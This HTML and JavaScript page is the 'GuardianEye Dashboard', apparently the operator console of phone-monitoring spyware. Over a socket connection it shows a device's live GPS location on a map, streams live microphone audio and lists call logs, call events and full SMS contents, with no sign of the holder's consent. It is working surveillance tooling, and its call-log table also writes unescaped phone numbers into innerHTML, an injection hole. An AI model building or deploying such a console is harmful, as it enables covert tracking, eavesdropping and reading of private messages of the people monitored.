<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GuardianEye Dashboard</title>
  <script src="/socket.io/socket.io.js"></script>

  <!-- Leaflet Map -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      background: #f4f6f9;
    }
    h1, h2 {
      text-align: center;
    }
    #map {
      height: 600px;
      width: 100%;
      margin-top: 10px;
      border-radius: 12px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    #status {
      margin: 10px 0;
      padding: 10px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
    }
    #startAudio {
      display: block;
      margin: 10px auto;
      padding: 10px 20px;
      background: #007bff;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }
    #startAudio:hover { background: #0056b3; }
    #audioStatus { text-align: center; margin-top: 5px; font-style: italic; }

    /* Call logs table */
    table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.1);}
    th, td { border: 1px solid #ddd; padding: 8px; text-align: center; }
    th { background: #007bff; color: #fff; }
    tr:nth-child(even) { background: #f9f9f9; }

    /* Real-time call events */
    #callEventsList, #smsLogsList {
      margin-top: 15px; padding: 10px; background: #fff; border: 1px solid #ddd; border-radius: 8px;
      max-height: 200px; overflow-y: auto; box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    #callEventsList div, #smsLogsList div { margin-bottom: 5px; padding: 5px; border-bottom: 1px solid #eee; }
    #callEventsList div:last-child, #smsLogsList div:last-child { border-bottom: none; }
  </style>
</head>
<body>
  <h1>GuardianEye Dashboard</h1>
  <div id="status">ðŸ”´ Disconnected</div>

  <h2>Live Map</h2>
  <div id="map"></div>

  <h2>Live Audio</h2>
  <button id="startAudio">â–¶ Start Listening</button>
  <p id="audioStatus">Click the button to start audio.</p>

  <h2>ðŸ“‹ Call Logs</h2>
  <table id="callLogsTable">
    <thead>
      <tr>
        <th>Number</th>
        <th>Type</th>
        <th>Date</th>
        <th>Duration (s)</th>
      </tr>
    </thead>
    <tbody id="callLogsBody">
      <tr><td colspan="4">Waiting for call logs...</td></tr>
    </tbody>
  </table>

  <h2>ðŸ“ž Real-time Call Events</h2>
  <div id="callEventsList">
    <div>Waiting for call events...</div>
  </div>

  <h2>ðŸ’¬ SMS Logs</h2>
  <div id="smsLogsList">
    <div>Waiting for SMS logs...</div>
  </div>

  <script>
    const socket = io();

    const statusDiv = document.getElementById("status");
    socket.on("connect", () => {
      statusDiv.innerText = "ðŸŸ¢ Connected to server";
      statusDiv.style.color = "green";
      socket.emit("listener-register");
    });
    socket.on("disconnect", () => { statusDiv.innerText = "ðŸ”´ Disconnected"; statusDiv.style.color = "red"; });

    // === MAP ===
    const map = L.map('map').setView([20, 78], 5);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'Â© OpenStreetMap contributors' }).addTo(map);
    let marker;
    socket.on("location-update", (data) => {
      if (!data.lat || !data.lng) return;
      if (!marker) marker = L.marker([data.lat, data.lng]).addTo(map);
      else marker.setLatLng([data.lat, data.lng]);
      map.setView([data.lat, data.lng], 15);
    });

    // === AUDIO ===
    let audioContext = null, audioQueue = [], isPlaying = false;
    document.getElementById("startAudio").addEventListener("click", () => {
      if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        document.getElementById("audioStatus").innerText = "ðŸŽ§ Listening...";
      }
      if (!isPlaying) playNextChunk();
    });
    function playNextChunk() {
      if (!audioQueue.length || !audioContext) { isPlaying=false; return; }
      const float32Array = audioQueue.shift();
      const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
      audioBuffer.copyToChannel(float32Array, 0);
      const bufferSource = audioContext.createBufferSource();
      bufferSource.buffer = audioBuffer;
      bufferSource.connect(audioContext.destination);
      bufferSource.onended = playNextChunk;
      bufferSource.start(); isPlaying = true;
    }
    socket.on("audio-chunk", (base64Chunk) => {
      if (!audioContext) return;
      const byteString = atob(base64Chunk.replace(/\n/g,''));
      const buffer = new Uint8Array(byteString.length);
      for (let i=0;i<byteString.length;i++) buffer[i]=byteString.charCodeAt(i);
      const float32Array = new Float32Array(buffer.length/2);
      for (let i=0;i<float32Array.length;i++){
        let int16=(buffer[i*2+1]<<8)|buffer[i*2];
        if(int16>=32768) int16-=65536;
        float32Array[i]=int16/32768;
      }
      audioQueue.push(float32Array);
      if(!isPlaying) playNextChunk();
    });

    // === CALL LOGS ===
    const callLogsBody = document.getElementById("callLogsBody");
    socket.on("call-logs", logs => {
      callLogsBody.innerHTML="";
      if(!logs || logs.length===0) { callLogsBody.innerHTML="<tr><td colspan='4'>No call logs available</td></tr>"; return; }
      logs.forEach(log=>{
        const row=document.createElement("tr");
        row.innerHTML=`<td>${log.number||"Unknown"}</td><td>${log.type}</td><td>${new Date(log.date).toLocaleString()}</td><td>${log.duration}</td>`;
        callLogsBody.appendChild(row);
      });
    });

    // === REAL-TIME CALL EVENTS ===
    const callEventsList = document.getElementById("callEventsList");
    socket.on("call-event", event => {
      const div = document.createElement("div");
      div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
      callEventsList.prepend(div);
    });

    // === SMS LOGS ===
    const smsLogsList = document.getElementById("smsLogsList");
    socket.on("sms-logs", smsArray => {
      smsLogsList.innerHTML = "";
      if(!smsArray || smsArray.length===0) {
        smsLogsList.innerHTML="<div>No SMS logs available</div>";
        return;
      }
      smsArray.forEach(sms => {
        const div = document.createElement("div");
        div.innerText = `[${new Date(sms.date).toLocaleString()}] ${sms.address || "Unknown"}: ${sms.body}`;
        smsLogsList.appendChild(div);
      });
    });
  </script>
</body>
</html>
